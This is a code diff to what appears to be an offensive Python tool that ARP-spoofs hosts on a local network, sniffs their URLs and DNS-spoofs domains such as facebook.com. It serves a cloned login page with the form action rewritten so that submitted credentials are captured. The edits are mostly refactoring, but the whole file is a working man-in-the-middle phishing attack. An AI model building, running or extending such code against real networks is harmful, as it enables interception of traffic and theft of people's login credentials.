@@ -29,8 +29,7 @@ URLSKIP = ["ocsp", ".jpg", ".jpeg", ".gif", ".png", ".css", ".ico", ".js", ".svg
 
 WHITE = "\033[0m"       # MAIN
 GRAY = "\033[37m"       # EXTRA
-ORANGE = "\033[33m"     # WARNING
-RED = "\033[31m"        # ERROR, CREDS
+RED = "\033[31m"        # CREDS
 
 
 class ARPSpoof(Thread):
@@ -132,7 +131,10 @@ class URLInspect(Thread):
                     if not url == self.past_url:
                         self.conn.send(["POST", [self.host, gethostbyname(url.split("/")[0]), url]])
                         self.past_url = url
+            except:
+                pass
 
+            try:
                 if host and get:
                     url = host+get
                     if not any(i in url for i in URLSKIP):
@@ -169,7 +171,6 @@ class HTTPHandler(BaseHTTPRequestHandler):
             except:
                 self.send_error(404, "Server Not Found.")
 
-
     def do_POST(self):
 
         if self.path == "/login":
@@ -190,12 +191,12 @@ class HTTPHandler(BaseHTTPRequestHandler):
                 self.send_response(200)
                 self.send_header('Content-type', 'text/html')
                 self.end_headers()
-                self.wfile.write("<meta http-equiv=\"refresh\" content=\"5; url=https://%s\" />" %
-                                 self.dname)
+                html = "<meta http-equiv=\"refresh\" content=\"3; url=https://%s\" />" % self.dname
+                self.wfile.write(html)
                 self.wfile.close()
 
             except:
-                self.send_error(404, "Server Not Found.")
+                pass
 
             self.conn.send(["STOP", None])
 
@@ -204,11 +205,11 @@ class HTTPHandler(BaseHTTPRequestHandler):
         return
 
 
-class WebServer(Thread):
+class WebServer(Process):
 
     def __init__(self, fp, dname, port, conn):
 
-        Thread.__init__(self)
+        Process.__init__(self)
         self.fp = fp
         self.dname = dname
         self.port = port
@@ -265,8 +266,8 @@ class DNSSpoof(Process):
                     pkt.set_verdict(NF_DROP)
 
                     if not self.server_on:
-                        server_thrd = WebServer(self.fp_bank[dname], dname, 80, self.conn)
-                        server_thrd.start()
+                        server_proc = WebServer(self.fp_bank[dname], dname, 80, self.conn)
+                        server_proc.start()
                         self.server_on = True
 
                     reply = (IP(dst=ip.src, src=ip.dst) /
@@ -280,7 +281,6 @@ class DNSSpoof(Process):
 
         # TO BE IMPLEMENTED PROPERLY
         return re.sub('action=".*?"', 'action="/login"', html)
-        # return sub('action="([^"]*)"', 'action="/login"' % html)
 
     def get_fp_bank(self, dnames):
 
@@ -296,7 +296,14 @@ class DNSSpoof(Process):
 
         fp_bank = {}
         for dname in fixed:
-            hfile = urlopen("http://%s" % dname)
+
+            try:
+                hfile = urlopen("http://%s" % dname)
+            except:
+                self.conn.send(["STAT", "No internet!"])
+                self.conn.send(["STOP", None])
+                return fp_bank
+
             fp_bank[dname] = self.falsify(hfile.read())
 
         return fp_bank
@@ -319,7 +326,7 @@ class NScan(Process):
         netid = p.communicate()[0].rstrip()
 
         ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
-                         ARP(pdst=netid), timeout=4, iface=self.iface, inter=0.1)
+                         ARP(pdst=netid), timeout=5, iface=self.iface, inter=0.1)
 
         for snd, rcv in ans:
             if rcv.psrc not in [self.gw_ip, self.iface_ip] + self.hosts:
@@ -459,7 +466,6 @@ def main():
 
         child_conn.send(["STOP", None])
 
-    print(WHITE + "Initializing")
     signal(SIGINT, sig_handler)
 
     parser = ArgumentParser()
@@ -483,7 +489,9 @@ def main():
     parent_conn, child_conn = Pipe()
 
     if geteuid() != 0:
-        exit(RED + "ERROR: Please run as root/superuser")
+        exit(WHITE + "Please run as root/superuser")
+
+    print(WHITE + "Initializing")
 
     if args.http:
         global SHOWHTTP
@@ -496,7 +504,7 @@ def main():
     if args.iface:
         iface = args.iface
     else:
-        print(ORANGE + "WARNING: No interface specified, using default (%s)" % conf.iface)
+        print(WHITE + "No interface specified, using default (%s)" % conf.iface)
         iface = conf.iface
 
     if args.dnames:
@@ -504,7 +512,7 @@ def main():
         DOMAINS = args.dnames.split()
     else:
         DOMAINS = ["facebook.com"]
-        print(ORANGE + "WARNING: No domains specified, using default [facebook.com]")
+        print(WHITE + "No domains specified, using default [facebook.com]")
 
     iface_ip = get_ip(iface)
     iface_mac = get_if_mac(iface)
@@ -529,7 +537,7 @@ def main():
             urlinspect_thrds.append(URLInspect(iface, args.ip, child_conn))
             urlinspect_thrds[-1].start()
         else:
-            exit(RED + "ERROR: IP address is invalid")
+            exit(WHITE + "IP address is invalid")
 
     else:
         print(WHITE + "Scanning network")
@@ -541,16 +549,15 @@ def main():
                 recieved = parent_conn.recv()
 
                 if recieved[0] == "HOST":
-                    print(GRAY + "Spoofing %s" % recieved[1])
+                    print(GRAY + "Host detected %s" % recieved[1])
                     hosts.append(recieved[1])
 
+                    print(GRAY + "Spoofing %s" % recieved[1])
                     arpspoof_thrds.append(ARPSpoof(iface, iface_mac, gw_ip, gw_mac, recieved[1]))
                     arpspoof_thrds[-1].start()
 
                     urlinspect_thrds.append(URLInspect(iface, recieved[1], child_conn))
                     urlinspect_thrds[-1].start()
-
-                    print(GRAY + "Host detected %s" % recieved[1])
 
             if not nscan_proc.is_alive():
                 break
@@ -558,7 +565,7 @@ def main():
             sleep(0.2)
 
         if hosts == []:
-            print(ORANGE + "No hosts detected")
+            print(WHITE + "No hosts detected")
             exit(0)
 
     dnsspoof_proc = DNSSpoof(iface_ip, hosts, DOMAINS, child_conn)
